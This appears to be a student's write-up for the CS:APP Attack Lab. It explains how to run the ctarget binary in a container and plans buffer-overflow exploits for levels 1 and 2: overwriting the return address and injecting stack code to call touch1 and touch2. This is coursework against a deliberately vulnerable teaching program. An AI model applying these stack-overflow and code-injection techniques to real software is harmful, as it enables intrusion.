The ./ctarget program checks hostname against the string
`makoshark.ics.cs.cmu.edu` or `whaleshark.ics.cs.cmu.edu` so just set one of
those as the hostname when you run the container:

```
docker run --network=none --hostname=makoshark.ics.cs.cmu.edu -it -v "$PWD:/home/csapp" xieguochao/csapp /bin/bash
```

Also, there is a `changeme.yourschool.edu` host baked into the binary that can
either be patched out or you can just set it in /etc/hosts

```
docker run --network=none --hostname=makoshark.ics.cs.cmu.edu --add-host changeme.yourschool.edu:127.0.0.1 -it -v "$PWD:/home/csapp" xieguochao/csapp /bin/bash
```

You will also need to have a listening server on port 15514 for ./ctarget to
connect to. I provided a basic server that will listen on that port and write to
stdout since nc is not in the container image. It also responds with the HTTP
response ./ctarget expects. You just need to build it outside of the container:

```
CGO_ENABLED=0 go build -o ./server server.go
```

Then run it inside the container:

```
./server &
```

# ctarget - Level 1

test calls getbuf, have getbuf return to touch1

stack state:

```
0x5561dc40:	0x0	0x0
0x5561dc50:	0x0	0x0
0x5561dc60:	0x0	0x0
0x5561dc70:	0x0	0x0 <- rsp
0x5561dc80:	0x0	0x0
0x5561dc90:	0x0	0x55586000
0x5561dca0:	0x401976 <test+14>	0x9
0x5561dcb0:	0x401f24 <launch+112>	0x0
(gdb) p $rsp
$2 = (void *) 0x5561dc78
```

this means we have to write from c78 up to ca0

78-7f (8 bytes)
80-8f (16 bytes)
90-9f (16 bytes)
a0 = c0
a1 = 17
a2 = 40

x4017c0

How to generate bytes:

```
./hex2raw -i c-lvl1.txt | sed -z 's/\n$//' | od -vxaAx
./hex2raw -i c-lvl1.txt | sed -z 's/\n$//' > c-lvl1.bin
```

How to run:

```
./ctarget -i c-lvl1.bin
```

# ctarget - Level 2

The general idea is that I need to:

1. Write a bunch of instructions directly to the stack.
2. Use the overflow exploit to point the return address of the current function
   to the instructions I wrote on the stack.
2. Use the overflow exploit to point the next return address to the touch2
   function.
3. Instructions need to set %rdi and then return to jump to touch2.

stack state:

```
(gdb) p $rsp
$3 = (void *) 0x5561dc78
(gdb) x/7gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000009
(gdb) x/gx touch2
0x4017ec <touch2>:      0x05c7fa8908ec8348
```

1. Write instructions starting at 0x5561dc98.
2. Write 0x5561dc78 as ret address at 0x5561dca0 to call instructions.

```
gcc -c c-lvl2.s
objdump -d c-lvl2.o
```

How to generate bytes:

```
./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' | od -vxaAx
./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' > c-lvl2.bin
```

How to run:

```
./ctarget -i c-lvl2.bin
```
